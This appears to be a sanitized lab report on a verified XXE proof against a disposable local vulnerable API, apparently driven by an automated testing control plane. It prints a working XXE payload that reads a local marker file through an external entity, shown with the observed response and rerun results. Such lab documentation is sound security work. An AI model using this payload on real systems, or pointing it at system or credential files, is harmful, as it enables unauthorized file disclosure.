> Public sanitized edition: sensitive personal, target, path, IP, alias, advisory, and run-specific evidence fields are redacted. This repository does not authorize live testing.

# verified_lab_flow_modern_api_xxe_safe_marker

Status: verified-impact / authorized local lab / bounded XXE-style proof
Date: 2026-05-22
Route/tool: Windows Hermes control plane -> SSH/SCP -> `<attacker-vm>` -> local disposable target `http://127.0.0.1:18080`
Target implementation: `labs/modern_vuln_api/modern_vuln_api.py`
Artifacts: `<artifact-output-dir>/modern_api_wave2_20260522T022303Z/`
Sources mapped: OWASP A05 Security Misconfiguration / XXE, CWE-611, CISA KEV/NVD/Exploit-DB XXE pattern inspiration

## Why this target was added

The existing Juice Shop lab did not expose a clear XML parser surface. This disposable target adds a bounded XXE-style marker expansion so parser-risk workflow and evidence handling can be exercised safely.

## Verified flow

The lab creates a safe marker file:

```text
/tmp/hermes_modern_api_xxe_marker.txt
XXE_SAFE_MARKER_HERMES_LOCAL_LAB
```

Request:

```xml
<?xml version="1.0"?>
<!DOCTYPE data [ <!ENTITY xxe SYSTEM "file:///tmp/hermes_modern_api_xxe_marker.txt"> ]>
<data>&xxe;</data>
```

Observed:

```text
POST /xxe -> HTTP 200
marker_found=yes
marker=XXE_SAFE_MARKER_HERMES_LOCAL_LAB
```

## Impact

Level 3 lab impact: XML entity expansion/read of a known safe marker file. This is not arbitrary sensitive file exfiltration; it is a bounded local-lab proof.

## Evidence

- `<artifact-output-dir>/modern_api_wave2_20260522T022303Z/xxe/payload.xml`
- `<artifact-output-dir>/modern_api_wave2_20260522T022303Z/xxe/response.json`
- `<artifact-output-dir>/modern_api_wave2_20260522T022303Z/observations.jsonl`

## Boundaries

- Only a known safe marker file is expanded.
- No `/etc/passwd`, cloud metadata, or real secrets.
- No external callback.

## 2026-05-23 dedicated one-vulnerability rerun

Status: verified-impact / dedicated XXE safe-marker runner
Handoff: `handoff/modern_api_xxe_safe_marker_wave1_20260523.md`
Runner: `scripts/labs/modern_api_xxe_safe_marker_wave1.sh`
Artifacts: `<artifact-output-dir>/modern_api_xxe_safe_marker_20260523T070157Z/`
OSS references: `setting/local/oss_refs/xxe_safe_marker_20260523/`

Improvements over the original multi-vulnerability wave:

- Uses a dedicated one-vulnerability runner instead of the broad `modern_api_wave2_test.sh`.
- Adds two controls: no-entity XML and wrong-file XML.
- Runs from attacker VM to Docker-published victim target `<lab-ip>:18081`.
- Preserves pre/post health, observations, positive request/response, control requests/responses, and cleanup proof.

Verified result:

```text
positive_marker_found: yes
controls_ok: yes
post_health: 200
verdict: verified_impact_lab_only
```
